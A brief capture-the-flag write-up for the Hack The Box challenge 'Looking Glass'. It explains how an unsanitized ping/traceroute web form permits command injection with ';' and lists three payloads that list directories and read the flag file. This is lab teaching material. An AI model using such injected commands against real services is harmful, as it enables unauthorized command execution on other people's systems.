# Looking Glass
Solution to Hack The Box Challenge - Looking Glass

### Problem

We've built the most secure networking tool in the market, come and check it out!

### Solution

You visit a web that offers run the command ping or traceroute indicating an IP and returns the console log.

If there is no sanitization you can inject console commands using ```;``` as separator.

I used the following payloads on the form

```
46.101.54.225 -c; ls
46.101.54.225 -c; cd ../; ls
46.101.54.225 -c; cd ../; cat flag_5Fdxy
```

And you get the flag

